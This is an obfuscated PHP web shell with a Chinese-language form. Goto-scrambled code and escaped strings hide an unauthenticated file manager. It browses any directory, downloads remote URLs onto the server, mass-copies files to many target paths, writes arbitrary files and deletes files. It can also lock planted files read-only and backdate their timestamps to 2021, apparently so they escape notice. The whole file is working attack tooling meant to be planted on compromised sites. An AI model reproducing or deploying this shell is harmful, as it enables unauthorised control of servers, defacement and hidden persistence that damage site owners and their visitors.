<?php
 goto aqTE4; YMq4Q: goto kH40Q; goto bm78_; vDDKc: function php_self() { $php_self = substr($_SERVER["\120\x48\120\137\123\x45\x4c\106"], strrpos($_SERVER["\120\110\120\137\123\105\x4c\x46"], "\57") + 1); return $php_self; } goto JyAZY; VqE7x: if ($_POST["\x61\x63\x74\151\x6f\156"] == "\x75\x70\154\x6f\x61\144") { @upload(); } goto YMq4Q; LHxAd: if ($_POST["\x61\x63\164\151\x6f\x6e"] == "\144\145\154\145\164\x65") { delete(); } goto wzwkW; WJ1qx: e5Sa1: goto zR68D; TkSXM: kH40Q: goto LHxAd; VXr4u: function list_files($dir) { if (is_dir($dir)) { if ($handle = opendir($dir)) { $arr1 = array(); $arr2 = array(); while (($file = readdir($handle)) !== false) { if ($file != "\x2e" && $file != "\56\56" && $file != "\x54\x68\x75\x6d\142\x73\56\x64\x62") { if (!is_dir($dir . "\57" . $file)) { array_push($arr1, "\74\x6c\151\76\74\x61\40\x74\x61\x72\147\145\164\75\42\x5f\x62\x6c\141\x6e\153\42\40\x68\162\x65\146\75\x22" . $dir . "\x2f" . $file . "\x22\76" . $file . "\x3c\x2f\141\76\74\x2f\154\151\76" . "\xa"); } else { array_push($arr2, "\74\154\x69\x20\x73\164\x79\154\x65\75\x22\x6c\151\x73\x74\55\163\164\171\154\x65\x3a\x6e\157\x6e\145\42\76\74\x61\x20\x73\x74\x79\x6c\145\75\42\x63\x6f\154\x6f\x72\x3a\x72\x65\144\x22\40\x68\x72\145\146\75\42" . php_self() . "\x3f\x70\141\x74\150\x3d" . $dir . "\x2f" . $file . "\x22\x3e" . $file . "\x3c\57\x61\76\74\57\x6c\151\76" . "\12"); } } } closedir($handle); echo "\x3c\165\154\76"; foreach ($arr2 as $key => $value) { echo $value; } foreach ($arr1 as $key => $value) { echo $value; } echo "\74\57\x75\x6c\x3e"; } } } goto Pu2IW; tmPQX: goto qI13Z; goto cN9BO; XPh3z: echo "\x3c\x73\160\x61\156\x20\x73\164\171\x6c\x65\x3d\42\146\x6f\x6e\164\x2d\167\145\x69\147\150\164\x3a\x20\x62\x6f\154\x64\x3b\42\x3e\xe5\xbd\223\345\x89\x8d\xe7\233\xae\xe5\275\x95\xef\xbc\232" . $curdir . "\74\57\x73\x70\141\x6e\76"; goto N3CaN; QnGoC: if (!is_null($_GET["\160\x61\164\150"])) { $path = $_GET["\160\141\x74\x68"]; } goto UZAmk; M4pwO: goto FzO3c; goto ShugT; P0V3d: function upload() { $yurl = $_POST["\x79\165\x72\154\163"]; $turl = $_POST["\164\x75\x72\154\163"]; $zuo = $_POST["\172\x75\x6f"]; $time2 = $_POST["\x74\151\x6d\145\x32"]; $yurls = explode("\xa", $yurl); $turls = explode("\xa", $turl); if ($yurl && $turl) { foreach ($yurls as $k0 => $v0) { $yname = end(explode("\x2f", $v0)); foreach ($turls as $key => $value) { $mburl = trim($value) . "\x2f" . trim($yname); echo $mburl; echo "\74\142\162\76"; copy(trim($v0), trim($mburl)); if ($zuo == 1) { chmod(trim($mburl), 292); } if ($time2 == 2) { touch(trim($mburl), mktime(19, 5, 10, 10, 26, 2021)); } } } } if ($yurl && $turl) { echo "\344\270\x8a\xe4\274\240\xe5\256\214\xe6\xaf\225"; } } goto bGvyN; bGvyN: goto IiCEg; goto WJ1qx; VTGYI: goto xgWqd; goto Wlzf6; ugCPB: function delete() { $yurl = $_POST["\x79\165\162\154\163"]; $turl = $_POST["\x74\165\x72\x6c\x73"]; $yurls = explode("\xa", $yurl); $turls = explode("\xa", $turl); if ($yurl && $turl) { foreach ($yurls as $k0 => $v0) { $yname = end(explode("\x2f", $v0)); if (!$yname) { $yname = $v0; } foreach ($turls as $key => $value) { $mburl = trim($value) . "\x2f" . trim($yname); unlink($mburl); } } } if ($yurl && $turl) { echo "\xe5\x88\240\xe9\231\244\345\xae\x8c\346\xaf\x95"; } } goto tmPQX; IrqDO: goto Q8G_S; goto qmqM2; gCzin: list_files($path); goto MiROX; JyAZY: goto MM6Fy; goto dFhYB; sruK0: goto uMm2W; goto J371w; ChZ7I: Y4zA0: goto Csob0; wmhae: UBRcI: goto LQx05; WCqdd: Qoa3L: goto zOkJL; WTK6o: blP6r: goto dCX8E; dCX8E: ?>
</td></tr></table><html><head><title></title><style type="text/css">.ppp{display:flex;align-items:center}.ppp1{display:flex;align-items:center}.ppp2{display:flex;align-items:center}.ppp21{display:flex;align-items:center}.ppp11{display:flex;align-items:center}.ppp211{display:flex;align-items:center}</style></head><body><form action=""method="POST"><div style="display:flex;align-items:center;justify-content:space-around"><div class="ppp"><table border="1"width="100%"bordercolor="#0033CC"><tr><td><table border="3"width="100%"><tr><td width="200"bordercolor="#000000">地址：</td><td width="87%"><span class="ppp11"><textarea cols="80"name="yurls"rows="10"></textarea></span></td></tr><tr><td width="200"bordercolor="#000000">选项:</td><td><table border="0"width="414"><tr><td width="67"><label>上锁:</label></td><td width="337"><label><input name="zuo"id="zuo"type="checkbox"value="1"></label></td></tr><tr><td>修改时间</td><td><input name="time2"id="time2"type="checkbox"value="2"> <label></label></td></tr></table></td></tr><tr><td width="200"bordercolor="#000000">输入目标地址：</td><td><span class="ppp211"><textarea cols="100"name="turls"rows="30"></textarea></span></td></tr><tr><td></td><td><button name="action"type="submit"value="upload">一键复制</button> <button name="action"type="submit"value="delete">一键删除</button></td></tr></table></td></tr><tr><td></td></tr><tr><td><table border="1"width="100%"bordercolor="#669900"><tr><td>输入创建文件名：</td><td><input name="filename"></td></tr><tr><td width="23%">输入内容或者url：</td><td width="77%"><textarea cols="100"name="context"rows="20"></textarea></td></tr><tr><td colspan="2"><div align="center"><button name="action"type="submit"value="addbycot">内容上传</button> <button name="action"type="submit"value="addbyurl">下载上传</button></div></td></tr></table></td></tr></table></div><div class="ppp"><div align="center"></div></div></div></form><?php  goto IrqDO; dF1bm: QIOr7: goto gCzin; UZAmk: goto h9Ng2; goto WTK6o; N3CaN: goto N8Vaw; goto ARL2D; wzwkW: goto Qoa3L; goto WCqdd; ag_ot: goto QIOr7; goto CnGVk; aqTE4: ?>
<style text="text/css">a{text-decoration-line:none}li{padding:5px}</style><?php  goto sruK0; J371w: jFQGE: goto vDDKc; K8kui: qI13Z: goto XtQNQ; LgmZ9: reS_Z: goto XPh3z; VkBks: $path = "\x2e"; goto VTGYI; RShHQ: goto reS_Z; goto dF1bm; LQx05: ?>
<table border="1"width="100%"><tr><td><?php  goto skGrn; bm78_: IiCEg: goto ugCPB; zOkJL: if ($_POST["\141\143\164\x69\x6f\x6e"] == "\141\144\144\x62\171\x63\157\164" || $_POST["\x61\x63\x74\x69\157\156"] == "\141\x64\144\142\171\x75\x72\154") { @add(); } goto eA9nn; gAMMj: error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING); goto b7_of; skGrn: goto Xp17v; goto LgmZ9; qmqM2: FzO3c: goto VqE7x; Csob0: function endWith($str, $suffix) { $length = strlen($suffix); if ($length == 0) { return true; } return substr($str, -$length) === $suffix; } goto ve_oO; MiROX: goto blP6r; goto tr_Vr; eA9nn: goto e5Sa1; goto K8kui; dFhYB: MM6Fy: goto VXr4u; tr_Vr: xgWqd: goto QnGoC; b7_of: goto jFQGE; goto wmhae; ve_oO: goto QubGR; goto TkSXM; K8mj9: error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING); goto HTY6N; CnGVk: Xp17v: goto VkBks; cN9BO: Q8G_S: goto K8mj9; HTY6N: goto Y4zA0; goto ChZ7I; A3ply: $curdir = realpath($path); goto RShHQ; Pu2IW: goto UBRcI; goto Zl00o; XtQNQ: function add() { $cot = $_POST["\143\157\x6e\164\x65\x78\164"]; $fname = $_POST["\146\151\x6c\145\x6e\141\x6d\145"]; if ($cot && $fname) { if ($_POST["\141\x63\x74\151\157\156"] == "\x61\144\144\142\171\143\x6f\164") { $content = $cot; } else { $content = file_get_contents(trim($cot)); } $myfile = fopen($fname, "\x77") or die("\xe5\244\261\350\264\xa5"); fwrite($myfile, $content); fclose($myfile); echo "\344\xb8\212\xe4\274\240\xe6\x88\220\xe5\212\x9f"; } } goto M4pwO; ARL2D: N8Vaw: goto z5VPA; ShugT: QubGR: goto P0V3d; Wlzf6: h9Ng2: goto A3ply; Zl00o: uMm2W: goto gAMMj; z5VPA: if (dirname($curdir)) { echo "\74\154\151\x20\x73\164\171\154\145\75\42\154\151\x73\164\x2d\x73\164\171\x6c\145\72\x6e\157\x6e\x65\42\x3e\74\x61\40\163\x74\x79\154\145\x3d\x22\x63\157\154\x6f\162\x3a\162\x65\144\42\x20\150\x72\145\146\75\x22" . php_self() . "\x3f\160\x61\164\x68\75" . dirname($curdir) . "\x22\x3e\xe4\270\212\xe7\xba\247\74\57\x61\x3e\x3c\57\x6c\151\76"; } goto ag_ot; zR68D: ?>
</body></html>